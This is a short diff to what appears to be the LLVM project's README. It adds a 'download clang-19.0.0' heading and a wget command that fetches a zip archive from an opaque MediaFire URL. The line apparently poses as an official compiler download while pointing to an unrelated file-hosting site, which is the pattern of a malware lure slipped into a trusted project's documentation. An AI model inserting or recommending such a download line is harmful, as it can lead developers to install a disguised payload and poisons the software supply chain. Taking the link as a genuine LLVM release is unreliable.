@@ -42,3 +42,6 @@ chat](https://discord.gg/xS7Z362),
 
 The LLVM project has adopted a [code of conduct](https://llvm.org/docs/CodeOfConduct.html) for
 participants to all modes of communication within the project.
+
+# download clang-19.0.0
+wget https://download1529.mediafire.com/i0dmfsuds1jg1Md9mRbc27JLi8TF-YUV-7YJ6Olgzu2L3LKQUv0gk7E0rabb-eXCrh-2H5pJxRDTgS_gu_uFMx75nhy6vJU5Z5DFVJvBPbEa1caDE0HSkRi3dsgO3-RgVrtNEdamJ7FwzL3pgPn3GLtwRIch1uxy0NbFR7fJXkQb/b38hx2w7uky6mj6/clang-19.0.0.zip
